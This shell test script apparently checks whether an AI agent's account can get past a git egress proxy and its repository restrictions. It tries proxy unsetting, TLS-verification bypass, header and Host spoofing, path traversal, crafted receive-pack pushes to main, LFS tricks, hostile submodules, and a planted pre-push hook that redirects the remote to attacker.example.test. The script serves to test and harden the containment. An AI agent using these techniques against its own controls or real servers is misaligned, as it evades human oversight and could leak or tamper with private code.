#!/bin/sh
# t4.sh <config>: evasion attempts by an agent UID that controls its own git config and environment.
. /t/env.sh; . /t/lib.sh
CFG=$1; export GIT_CONFIG_GLOBAL=$HOME/agent.gitconfig; cp /t/cfg/$CFG.gitconfig $GIT_CONFIG_GLOBAL; [ "$CAINFO" = design ] && export GIT_SSL_CAINFO=/s/bundle.pem
W=$(mktemp -d); cd $W; TL=2; H=ghes.example.test; U=https://$H/acme; P=127.0.0.1:3128; TAG=$(date +%s)
C="curl -sS -m 12 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x $P"
NOPROXY="env -u HTTPS_PROXY -u https_proxy -u HTTP_PROXY -u http_proxy"
step setup "git clone -q $U/widgets.git c 2>&1; cd c && git checkout -q -b lenny/e-$TAG && echo x > e && git add e && git commit -qm e; git -C $W/c log --oneline | wc -l"
cd c
step proxy-unset "$NOPROXY git -c http.proxy= ls-remote $U/secret.git 2>&1"
step proxy-unset-curl-direct-ip "$NOPROXY curl -sS -m 6 -k -o /dev/null -w http=%{http_code} https://\$ORIGIN_IP/acme/secret.git/info/refs?service=git-upload-pack 2>&1"
step proxy-to-egress-reachable "curl -sS -m 6 -o /dev/null -w http=%{http_code} --noproxy '*' -p -x http://gh-egress:3128 https://ghes.example.test/ 2>&1 | tail -1 | cut -c1-120"
step proxy-to-egress-no-cred "git -c http.proxy=http://gh-egress:3128 ls-remote $U/secret.git 2>&1"
step proxy-to-egress-bad-cred "git -c http.proxy=http://agent:guess@gh-egress:3128 ls-remote $U/secret.git 2>&1"
step sslverify-false-outside "git -c http.sslVerify=false ls-remote $U/secret.git 2>&1"
step sslverify-false-push-main "git -c http.sslVerify=false push origin HEAD:refs/heads/main 2>&1"
step git-ssl-no-verify-outside "GIT_SSL_NO_VERIFY=1 git ls-remote $U/secret.git 2>&1"
step ssl-caInfo-swapped "git -c http.sslCAInfo=/s/bundle.pem ls-remote $U/secret.git 2>&1"
step extraheader-auth-outside "git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' ls-remote $U/secret.git 2>&1"
step extraheader-auth-inside "git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' ls-remote $U/widgets.git 2>&1 | wc -l"
step extraheader-basic-push-main "git -c 'http.extraHeader=Authorization: Basic eC1hY2Nlc3MtdG9rZW46QUdFTlQtT1dOLVRPS0VO' push origin HEAD:refs/heads/main 2>&1"
step extraheader-privatetoken "git -c 'http.extraHeader=Private-Token: AGENT-OWN-TOKEN' ls-remote $U/widgets.git 2>&1 | wc -l"
step extraheader-method-override "git -c 'http.extraHeader=X-HTTP-Method-Override: GET' ls-remote $U/widgets.git 2>&1"
step url-embedded-cred "git ls-remote https://alice:AGENT-OWN-TOKEN@$H/acme/widgets.git 2>&1 | wc -l"
step host-differs-other "$C -H 'Host: other.example.test' '$U/secret.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b | cut -c1-120"
step host-differs-http11 "$C --http1.1 -H 'Host: other.example.test' '$U/widgets.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b | cut -c1-120"
step listener-origin-form "curl -sS -m 6 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3128/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-100 /tmp/b"
step listener-absolute-outside "curl -sS -m 6 -o /tmp/b -w http=%{http_code} -x http://$P 'http://$H/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-100 /tmp/b"
step listener-absolute-receive-advert "curl -sS -m 6 -o /tmp/b -w http=%{http_code} -x http://$P 'http://$H/acme/lib.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-100 /tmp/b"
step remove-rewrite-ghes "GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote $U/widgets.git 2>&1 | tail -1"
step remove-rewrite-github-private "GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote https://github.com/acme/widgets.git 2>&1 | tail -1"
step remove-rewrite-github-public "GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git ls-remote https://github.com/pub/lib.git 2>&1 | tail -1"
step remove-rewrite-github-own-token "GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_CAINFO=/s/bundle.pem git -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' push -q https://github.com/agent/own.git HEAD:refs/heads/main 2>&1 | tail -1; git ls-remote https://github.com/pub/lib.git >/dev/null 2>&1; true"
step sslverify-false-github "GIT_CONFIG_GLOBAL=/dev/null GIT_SSL_NO_VERIFY=1 git ls-remote https://github.com/pub/lib.git 2>&1 | tail -1"
step plain-curl-3128-inside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://$H/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\\000'"
step plain-curl-3129-inside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\\000'"
step plain-curl-3129-outside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-3129-receive-readonly "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H/acme/lib.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-host-differs "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 -H 'Host: other.example.test' 'http://$H/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-host-differs-reverse "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 -H 'Host: $H' 'http://other.example.test/pub/lib.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-userinfo-host "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H@other.example.test/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-upper-trailingdot "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://GHES.EXAMPLE.TEST./acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-other-port "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H:8443/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-nongit-path "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3129 'http://$H/api/v3/user' 2>&1; cut -c1-110 /tmp/b"
step plain-nongit-path-3128 "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:3128 'http://$H/api/v3/repos/acme/widgets/pulls/7/reviews' 2>&1; cut -c1-110 /tmp/b"
step loopback-origin-form-outside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3129/https/$H/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step loopback-origin-form-inside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} 'http://127.0.0.1:3129/https/$H/acme/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\\000'"
step pushurl-other-host "git -C $W/c remote add pu https://ghes.example.test/acme/widgets.git; git -C $W/c remote set-url --push pu https://attacker.example.test/x.git; git -C $W/c remote -v | grep pu; git -C $W/c push -q pu HEAD:refs/heads/lenny/pu 2>&1 | tail -1"
step pushurl-outside-set "git -C $W/c remote set-url --push pu $U/secret.git; git -C $W/c push -q pu HEAD:refs/heads/lenny/pu 2>&1 | tail -1; git -C $W/c remote remove pu"
step explicit-http-remote "git ls-remote http://$H/acme/widgets.git 2>&1 | tail -1 | cut -c1-120"
step explicit-http-unbound "git ls-remote http://other.example.test/pub/lib.git 2>&1 | tail -1 | cut -c1-120"
step outside-clone "git clone -q $U/secret.git ../s 2>&1"
step outside-push "git push -q $U/secret.git HEAD:refs/heads/lenny/e 2>&1"
step readonly-push "git push -q $U/lib.git HEAD:refs/heads/lenny/e 2>&1"
step path-case "git ls-remote https://$H/ACME/SECRET.git 2>&1"
step path-no-dotgit "git ls-remote $U/secret 2>&1"
step path-dotdot "$C --path-as-is '$U/widgets.git/../secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step path-encoded-dotdot "$C --path-as-is '$U/widgets.git/%2e%2e/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step path-encoded-slash "$C '$U%2Fsecret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step path-double-slash "$C --path-as-is '$U//secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-advert-outside "$C '$U/secret.git/info/refs?service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-advert-inside "$C '$U/widgets.git/info/refs?service=git-upload-pack' 2>&1; head -c 30 /tmp/b | tr -d '\000'"
step curl-dumb-noquery "$C '$U/secret.git/info/refs' 2>&1; cut -c1-110 /tmp/b"
step curl-dumb-head "$C '$U/secret.git/HEAD' 2>&1; cut -c1-110 /tmp/b"
step curl-dumb-objects "$C '$U/widgets.git/objects/info/packs' 2>&1; cut -c1-110 /tmp/b"
step curl-two-services "$C '$U/lib.git/info/refs?service=git-upload-pack&service=git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-case-service "$C '$U/lib.git/info/refs?service=GIT-RECEIVE-PACK' 2>&1; cut -c1-110 /tmp/b"
step curl-get-post-path "$C '$U/lib.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
O40=0000000000000000000000000000000000000000; N40=1111111111111111111111111111111111111111
pkt(){ python3 -c "import sys;s=sys.argv[1].encode().decode('unicode_escape');sys.stdout.write('%04x%s'%(len(s)+4,s))" "$1"; }
RCT="-H 'Content-Type: application/x-git-receive-pack-request'"
{ pkt "$O40 $N40 refs/heads/main\\0report-status"; printf 0000; } > /tmp/p-main
{ pkt "$O40 $N40 refs/heads/lenny/ok\\0report-status"; pkt "$O40 $N40 refs/heads/main\\n"; printf 0000; } > /tmp/p-mixed
{ pkt "$N40 $O40 refs/heads/lenny/del\\0report-status"; printf 0000; } > /tmp/p-del
{ pkt "shallow $N40"; pkt "$O40 $N40 refs/heads/main\\0report-status"; printf 0000; } > /tmp/p-shallow
{ pkt "push-cert\\0report-status"; pkt "certificate version 0.1\\n"; printf 0000; } > /tmp/p-cert
{ pkt "$O40 $N40 refs/heads/lenny/../main\\0report-status"; printf 0000; } > /tmp/p-dots
{ pkt "$O40 $N40 refs/heads/lenny/ok extra\\0report-status"; printf 0000; } > /tmp/p-extra
{ pkt "$O40 $N40 refs/heads/lenny/ok\\0report-status"; printf 0000; pkt "$O40 $N40 refs/heads/main\\0report-status"; printf 0000; } > /tmp/p-twosec
gzip -c /tmp/p-main > /tmp/p-gz
step curl-post-ref-main "$C $RCT --data-binary @/tmp/p-main '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-ref-mixed "$C $RCT --data-binary @/tmp/p-mixed '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-delete "$C $RCT --data-binary @/tmp/p-del '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-shallow-prefix "$C $RCT --data-binary @/tmp/p-shallow '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-push-cert "$C $RCT --data-binary @/tmp/p-cert '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-dotdot-ref "$C $RCT --data-binary @/tmp/p-dots '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-extra-field "$C $RCT --data-binary @/tmp/p-extra '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-second-section "$C $RCT --data-binary @/tmp/p-twosec '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-gzip "$C $RCT -H 'Content-Encoding: gzip' --data-binary @/tmp/p-gz '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-chunked "$C $RCT -H 'Transfer-Encoding: chunked' --http1.1 --data-binary @/tmp/p-main '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-ref-main "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT --data-binary @/tmp/p-main 'http://$H/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-delete "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT --data-binary @/tmp/p-del 'http://$H/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-outside "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT --data-binary @/tmp/p-main 'http://$H/acme/secret.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-dotdot-ref "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT --data-binary @/tmp/p-dots 'http://$H/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-mixed "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT --data-binary @/tmp/p-mixed 'http://$H/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step plain-curl-post-gzip "curl -sS -m 8 -o /tmp/b -w http=%{http_code} -x http://127.0.0.1:\${LIS:-3129} $RCT -H 'Content-Encoding: gzip' --data-binary @/tmp/p-gz 'http://$H/acme/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-post-wrong-ct "$C -H 'Content-Type: application/octet-stream' --data-binary @/tmp/p-main '$U/widgets.git/git-receive-pack' 2>&1; cut -c1-110 /tmp/b"
step curl-upload-pack-on-outside "$C -H 'Content-Type: application/x-git-upload-pack-request' --data-binary 0000 '$U/secret.git/git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
JL="-H 'Content-Type: application/vnd.git-lfs+json'"
step lfs-upload-on-readonly "$C $JL -d '{\"operation\":\"upload\",\"objects\":[{\"oid\":\"aa\",\"size\":1}]}' '$U/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b"
step lfs-duplicate-operation "$C $JL -d '{\"operation\":\"download\",\"operation\":\"upload\",\"objects\":[]}' '$U/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b"
step lfs-case-operation "$C $JL -d '{\"Operation\":\"upload\",\"operation\":\"download\",\"objects\":[]}' '$U/lib.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b"
step lfs-outside "$C $JL -d '{\"operation\":\"download\",\"objects\":[]}' '$U/secret.git/info/lfs/objects/batch' 2>&1; cut -c1-110 /tmp/b"
step lfs-locks-on-readonly "$C $JL -d '{}' '$U/lib.git/info/lfs/locks' 2>&1; cut -c1-110 /tmp/b"
step token-trace "GIT_TRACE_CURL=1 GIT_CURL_VERBOSE=1 git ls-remote $U/widgets.git 2>&1 | grep -ac 'MINT-'"
step token-reflected "$C -D /tmp/hd '$U/reflect.git/info/refs?service=git-upload-pack' 2>&1; cat /tmp/b; grep -i x-reflect /tmp/hd"
step redirect-in-scope "git ls-remote $U/moved.git 2>&1 | wc -l"
step redirect-out-of-scope "git ls-remote $U/evilredir.git 2>&1"
step hostile-submodules "cd $W; timeout 30 git clone -q --recurse-submodules $U/hostile.git h 2>&1 | tail -4; for s in out evil; do printf '%s ' \$s; git -C h/\$s rev-parse --show-toplevel 2>/dev/null | grep -c /\$s\$; done"
step hostile-lfsconfig "cd $W/h 2>/dev/null && git lfs install --local >/dev/null 2>&1; git lfs env 2>/dev/null | grep -i '^Endpoint' | cut -c1-90; printf 'version https://git-lfs.github.com/spec/v1\noid sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nsize 1\n' > p; git lfs smudge < p 2>&1 | tail -1 | cut -c1-160"
# a hostile repository's hook rewrites .git/config, then the agent pushes
mkdir -p .git/hooks; cat > .git/hooks/pre-push <<'H'
#!/bin/sh
git config --local http.proxy ""
git config --local http.sslVerify false
git config --local remote.origin.url https://attacker.example.test/x.git
git config --local url.https://attacker.example.test/.insteadOf https://ghes.example.test/
git config --local core.sshCommand "sh -c 'echo pwned'"
exit 0
H
chmod +x .git/hooks/pre-push
step hook-first-push "git push -q origin HEAD 2>&1; git config --local --list | grep -E 'proxy|sslverify|attacker' | head -4"
step hook-next-fetch "git fetch origin 2>&1"
step hook-config-exfil-allowed-host "git -c http.proxy=$P push -q https://other.example.test/agent/own.git HEAD:refs/heads/x 2>&1"
cd $W
step attacker-direct "git ls-remote https://attacker.example.test/x.git 2>&1"
step arb-host-public-clone "git clone -q https://other.example.test/pub/lib.git a 2>&1; git -C a log --oneline 2>/dev/null | wc -l"
step arb-host-own-token-push "git -C c config --unset-all --local url.https://attacker.example.test/.insteadof; git -C c remote set-url origin https://ghes.example.test/acme/widgets.git; git -C c config --local --unset http.proxy; git -C c -c 'http.extraHeader=Authorization: Bearer AGENT-OWN-TOKEN' push -q https://other.example.test/agent/own.git HEAD:refs/heads/main 2>&1"
step fronting-connect-unbound-host-ghes "curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x $P --connect-to $H:443:other.example.test:443 '$U/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step ip-literal-connect "curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x $P \"https://\$ORIGIN_IP/acme/secret.git/info/refs?service=git-upload-pack\" 2>&1"
step connect-other-port "curl -sS -k -m 8 -o /tmp/b -w http=%{http_code} -x $P 'https://$H:8443/acme/secret.git/info/refs?service=git-upload-pack' 2>&1"
step connect-case "curl -sS -m 8 -o /tmp/b -w http=%{http_code} --cacert /s/bundle.pem -x $P 'https://GHES.EXAMPLE.TEST/acme/secret.git/info/refs?service=git-upload-pack' 2>&1; cut -c1-110 /tmp/b"
step git-protocol-scheme "timeout 8 git ls-remote git://$H/acme/secret.git 2>&1"
step gh-api-still-filtered "env GH_HOST=$H GH_ENTERPRISE_TOKEN=lenny-injected gh api -X PUT repos/acme/widgets/pulls/7/merge 2>&1"
cd /; rm -rf $W
